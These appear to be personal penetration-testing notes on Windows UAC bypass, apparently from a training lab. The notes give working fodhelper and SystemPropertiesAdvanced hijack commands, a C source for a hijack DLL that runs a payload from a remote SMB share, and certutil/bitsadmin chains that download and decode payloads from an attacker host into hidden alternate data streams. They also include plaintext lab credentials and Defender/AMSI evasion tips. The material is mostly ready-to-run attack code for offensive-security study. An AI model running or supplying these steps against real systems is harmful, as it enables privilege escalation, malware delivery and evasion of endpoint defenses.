- Can be useful if you have Admin session but want SYSTEM session
- Try running process Hollower w/ PPID spoofing from admin session first
- If possible, turn off Defender RTP first!
- If it doesn't work, try again!
- can also add an RDP user and launch system shell via psexec...
- **Best Method:** Fodhelper bypass manually - add new local admin, connect in, and launch shellcode runner

### Meterpreter
- Will likely get caught by Defender
- Can try exploit/windows/local/bypassuac_injection_winsxs

### *Fodhelper.exe

    **Run manually w/ a simple payload - add a new local Administrator**
    //Tips:
        *check with: shell; whoami /groups > look for Mandatory High Label; otherwise will have to perform bypass if Admin
        //msf:  ***set EnableStageEncoding true; set StageEncoder x64/xor_dynamic - DON'T USE zutto_dekiru!
        //if user has to enter creds of another to approve UAC, might need reg key in that user's hive (not hkcu)!

    //Fodhelper.exe UAC Bypass Triggers:
        //**For UAC bypass - Add Trigger using PS (via macro, etc.) OR LAUNCH DIRECTLY THE .EXE
        //the Trigger would go within a Word macro, etc., along with downloading/decoding the .exe or .js payload first - or within some other RCE
        //Meterpreter Method:
            //(after getting initial session, to get 2nd session) - REQUIRES AMSI BYPASS:
            use exploit/windows/local/bypassuac_fodhelper; show targets; set target ...; set session ...; set payload ....
        //PS Method 1 - SMB:
            New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "cmd.exe /c \\192.168.45.188\visualstudio\Hollow\Hollow\bin\x64\Release\Hollow.exe" -Force;New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force;start-sleep -s 5;C:\Windows\System32\fodhelper.exe
        //PS Method 2 - Local (more likely):
            //tries to launch priv shell, but if not, launches reg shell
            New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "cmd.exe /c C:\Windows\Tasks\Hollow.exe" -Force;New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force;start-sleep -s 5;try { start-process -windowstyle hidden C:\Windows\System32\fodhelper.exe; } catch [System.Exception] { cmd.exe /c C:\Windows\Tasks\Hollow.exe; }
            //transfer the .exe first:
                certutil -encode \\192.168.45.188\visualstudio\Hollow\Hollow\bin\x64\Release\Hollow.exe \\192.168.45.188\visualstudio\file.txt
                bitsadmin /Transfer myJob http://192.168.45.188/file.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt C:\Windows\Tasks\Hollow.exe && del C:\users\student\enc.txt
        //CMD.exe Method:
            reg add HKCU\Software\Classes\ms-settings\shell\open\command /t REG_SZ /ve /d "cmd.exe /c C:\Windows\Tasks\Hollow.exe" /f && reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f && timeout /t 5 && cmd.exe /c C:\Windows\System32\fodhelper.exe || cmd.exe /c C:\Windows\Tasks\Hollow.exe
        //InstallUtil method (to still run PS even if it's blocked) - Word Macro snip for Regular .Net Shellcode Runner:
            $payload = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe"
        //JScript Method:
            //First build w/ DotNetToJScript
            //add amsi bypass to top of script!
                    certutil -encode \\192.168.45.188\visualstudio\DotNetToJScript-master\DotNetToJScript\bin\Release\Hollow.js \\192.168.45.188\visualstudio\file.txt
                    bitsadmin /Transfer myJob http://192.168.45.188/file.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:Hollow.js" && del C:\users\student\enc.txt
                    wscript "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:Hollow.js" 
            //.Net script difference:
                string regValCmd = "wscript c:\\windows\\tasks\\test5.txt:Hollow.js";
            //Trigger for jscript method:
                New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "wscript c:\windows\tasks\test5.txt:Hollow.js" -Force;New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force;start-sleep -s 5;try { start-process -windowstyle hidden C:\Windows\System32\fodhelper.exe; } catch [System.Exception] { wscript c:\windows\tasks\test5.txt:Hollow.js; }

### *SystemPropertiesAdvanced.exe

    //Edit command in srrstr.c:
        WinExec("\\\\192.168.49.121\\visualstudio\\Hollow\\Hollow\\bin\\x64\\Release\\Hollow.exe", 0);
        //*Or:  WinExec("HollowUAC.exe", 0);             //works if app is in %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\
        //Test:  WinExec("calc2.exe", 0);

    //Compile srrstr.c:
        sudo i686-w64-mingw32-gcc-win32 srrstr.c -lws2_32 -o /var/www/html/srrstr.dll -shared && cp /var/www/html/srrstr.dll /home/kali/data/

    //Transfer DLL:
        IWR -Uri http://192.168.49.121/srrstr.dll -OutFile C:\Users\bob\AppData\Local\Microsoft\WindowsApps\srrstr.dll
        //Or:  
            del \\192.168.49.121\visualstudio\file.txt && certutil -encode \\192.168.49.121\visualstudio\srrstr.dll \\192.168.49.121\visualstudio\file.txt
            sudo cp  /home/kali/data/file.txt /var/www/html/
            bitsadmin /Transfer myJob http://192.168.49.121/file.txt %USERPROFILE%\Desktop\enc.txt && certutil -decode %USERPROFILE%\Desktop\enc.txt "%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\srrstr.dll" || del %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\srrstr.dll
            certutil -decode %USERPROFILE%\Desktop\enc.txt %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\srrstr.dll && del %USERPROFILE%\Desktop\enc.txt
        //Or:
            smbclient //192.168.189.132/C$ -U prod.corp1.com/bob%abc123!
            put /home/kali/data/srrstr.dll C:\Users\bob\AppData\Local\Microsoft\WindowsApps\

    //HollowUAC.exe method addition:
        //dev:  del \\192.168.49.121\visualstudio\file2.txt && certutil -encode \\192.168.49.121\visualstudio\Hollow\HollowUAC\bin\x64\Release\HollowUAC.exe \\192.168.49.121\visualstudio\file2.txt
        //kali:  sudo cp  /home/kali/data/file2.txt /var/www/html/
        //tgt:  
            bitsadmin /Transfer myJob http://192.168.49.121/file2.txt %USERPROFILE%\Desktop\enc2.txt && certutil -decode %USERPROFILE%\Desktop\enc2.txt "%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\HollowUAC.exe" || del %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\HollowUAC.exe
            certutil -decode %USERPROFILE%\Desktop\enc2.txt "%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\HollowUAC.exe" && del %USERPROFILE%\Desktop\enc2.txt

    //optional check:  rundll32.exe C:\Users\bob\AppData\Local\Microsoft\WindowsApps\srrstr.dll,xyz
    //***trigger:  cmd /c C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe

    //OVERALL:
        cmd.exe /c bitsadmin /Transfer myJob http://192.168.49.121/file.txt %USERPROFILE%\Desktop\enc.txt && certutil -decode %USERPROFILE%\Desktop\enc.txt %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\srrstr.dll || del %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\srrstr.dll
        cmd.exe /c timeout /T 25 && certutil -decode %USERPROFILE%\Desktop\enc.txt %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\srrstr.dll & del %USERPROFILE%\Desktop\enc.txt
        $payload = "cmd.exe /c bitsadmin /Transfer myJob http://192.168.49.121/file2.txt %USERPROFILE%\Desktop\enc2.txt && certutil -decode %USERPROFILE%\Desktop\enc2.txt %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\HollowUAC.exe || del %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\HollowUAC.exe
        cmd.exe /c timeout /T 25 && certutil -decode %USERPROFILE%\Desktop\enc2.txt %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\HollowUAC.exe & del %USERPROFILE%\Desktop\enc2.txt & echo 1 > c:\windows\tasks\a.txt"
        cmd /c timeout /T 40 && C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe

    //Only works for the SysWOW64 version?
    //Other affected binaries:
        SystemPropertiesComputerName.exe
        SystemPropertiesHardware.exe
        SystemPropertiesProtection.exe
        SystemPropertiesRemote.exe

    #############srrstr.c#############
    #include <windows.h>

    BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpReserved) {
        switch(dwReason) {
            case DLL_PROCESS_ATTACH:
                //WinExec("c:\\windows\\system32\\calc.exe", 0);
                WinExec("\\\\192.168.45.158\\visualstudio\\Hollow\\Hollow\\bin\\x64\\Release\\Hollow.exe", 0);
            case DLL_PROCESS_DETACH:
                break;
            case DLL_THREAD_ATTACH:
                break;
            case DLL_THREAD_DETACH:
                break;
        }

        return 0;
    }

### PowerSploit

    Invoke-WScriptUACBypass -Command cmd.exe -WindowStyle 'Visible'
    Invoke-BypassUAC -PayloadPath .\payload.dll -Verbose

### SharpBypassUAC (Automated)

    //Will probably get blocked by Defender
    //Bypass options:  eventvwr, fodhelper, computerdefaults, sdclt, slui

    //Encode your payload command:  echo -n 'cmd /c start calc.exe' | base64 -w0
    //Usage:  SharpBypassUAC.exe -b fodhelper -e Y21kIC9jIHN0YXJ0IGNhbGMuZXhl

    //Hollow.exe Example (cmd /c start c:\windows\tasks\Hollow.exe)
        copy \\192.168.49.121\visualstudio\Hollow\Hollow\bin\x64\Release\Hollow.exe c:\windows\tasks\
        \\192.168.49.121\visualstudio\SharpBypassUAC.exe -b fodhelper -e Y21kIC9jIHN0YXJ0IGM6XHdpbmRvd3MJYXNrc1xIb2xsb3cuZXhl

    //Hollow.exe Example 2 (\\192.168.49.121\visualstudio\Hollow\Hollow\bin\x64\Release\Hollow.exe)
        copy \\192.168.49.121\visualstudio\SharpBypassUAC.exe c:\windows\tasks\
        c:\windows\tasks\SharpBypassUAC.exe -b computerdefaults -e XDE5Mi4xNjguNDUuMjMyC2lzdWFsc3R1ZGlvXEhvbGxvd1xIb2xsb3cIaW5kXFJlbGVhc2VcSG9sbG93LmV4ZQ==